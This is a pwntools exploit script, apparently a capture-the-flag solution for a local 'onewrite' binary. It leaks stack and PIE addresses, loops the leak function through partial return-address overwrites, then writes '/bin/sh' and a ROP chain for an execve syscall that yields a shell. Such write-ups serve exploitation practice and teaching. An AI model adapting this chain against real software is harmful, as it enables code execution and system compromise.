'''
Author: Samrito
Date: 2022-03-09 18:20:33
LastEditors: Samrito
LastEditTime: 2022-03-13 10:35:55
'''
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


def leak_option(io, number):
    """select a option"""
    io.recvuntil(b' > ')
    io.sendline(number)


def do_overwrite(io, addr: int, s):
    '''do overwrite'''
    io.recvuntil(b'address : ')
    io.send(str(addr))
    io.recvuntil(b'data : ')
    io.send(s)


io = process('./onewrite')
leak_option(io, b'1')
res = io.recvline()[:-1]
leak_rsp_addr = int(res, 16)
print(hex(leak_rsp_addr))

#debug('b * $rebase(0x08AAD)')
do_overwrite(
    io, leak_rsp_addr - 0x8,
    b'\x15')  #pie 不改最后3字节，正好do_leak返回为\x09->nop，上为\x04->call do_leak且无参数
leak_option(io, b'2')
res = io.recvline()[:-1]
leak_addr = int(res, 16)
print(hex(leak_addr))
Pbase = leak_addr - 0x8a15
do_overwrite(io, leak_rsp_addr - 0x20, b'\x15')

for i in range(7):
    print('############ part 1: ' + str(i))
    leak_option(io, b'1')
    do_overwrite(io, leak_rsp_addr - 0x38 - (0x18 * i), b'\x15')

for i in range(7):
    print('############ part 2: ' + str(i))
    leak_option(io, b'1')
    do_overwrite(io, leak_rsp_addr - 0xc0 + (0x18 * i), p64(leak_addr))

pop_rax = 0x460ac + Pbase  # pop rax; ret;
pop_rsi = 0xd9f2 + Pbase  # pop rsi; ret;
pop_rdi = 0x84fa + Pbase  # pop rdi; ret;
pop_rdx = 0x484c5 + Pbase  # pop rdx; ret;
pop_rax = 0x460ac + Pbase  # pop rax; ret;
bss_addr = 0x2B3330 + Pbase
syscal = 0x6e605 + Pbase  # syscall;

leak_option(io, b'1')
do_overwrite(io, bss_addr, b'/bin/sh\x00')
payload = [pop_rdi, bss_addr, pop_rsi, 0, pop_rdx, 0, pop_rax, 0x3b, syscal]
for i in range(len(payload)):
    print('############ part 3: ' + str(i))
    leak_option(io, b'1')
    do_overwrite(io, leak_rsp_addr - 0x20 + (0x8 * i), p64(payload[i]))
raw_input()
for i in range(4):
    print('############ part 4: ' + str(i))
    leak_option(io, b'1')
    do_overwrite(io, leak_rsp_addr - 0xd0, b'pass')

io.interactive()